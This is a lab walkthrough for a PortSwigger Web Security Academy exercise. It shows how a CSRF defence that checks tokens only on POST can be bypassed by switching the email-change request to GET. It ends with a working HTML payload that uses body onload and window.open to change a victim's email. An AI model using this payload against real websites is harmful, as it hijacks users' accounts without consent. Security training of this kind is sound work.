
# CSRF where token validation depends on request method

This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter

Hint: You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

---------------------------------------------

Reference: https://portswigger.net/web-security/csrf

---------------------------------------------

Generated link: https://0af7002903ddc72c818c574600ce0059.web-security-academy.net/




<img width="764" height="406" alt="1" src="https://github.com/user-attachments/assets/5b37b3aa-451d-446d-bb1d-8f9f65b60b3f" />




<img width="725" height="314" alt="2" src="https://github.com/user-attachments/assets/7edba5c3-2aab-4fd8-a955-f537496522b2" />


The email-change operation is sent as a POST request:



<img width="516" height="467" alt="3" src="https://github.com/user-attachments/assets/8ee9ec71-f9c9-43d5-a278-8add329f0a48" />


Next, try sending the same operation with the GET method:

/my-account/change-email?email=test3%40test.com




<img width="513" height="464" alt="4" src="https://github.com/user-attachments/assets/cf205543-435f-4593-ae4a-fb0c93411635" />


The server responds with a redirect. Following that redirect completes the email update:



<img width="251" height="150" alt="5" src="https://github.com/user-attachments/assets/d536b36a-5f57-41b6-aa83-42a20969cdc3" />




<img width="272" height="323" alt="6" src="https://github.com/user-attachments/assets/d604a7df-c861-454f-95dd-83dd94d14ba9" />



The resulting payload is:

```
<body onload="window.open('https://0af7002903ddc72c818c574600ce0059.web-security-academy.net/my-account/change-email?email=test3%40test.com')">
```


<img width="1168" height="648" alt="7" src="https://github.com/user-attachments/assets/c824407d-3229-4602-8409-af7547b64a9e" />

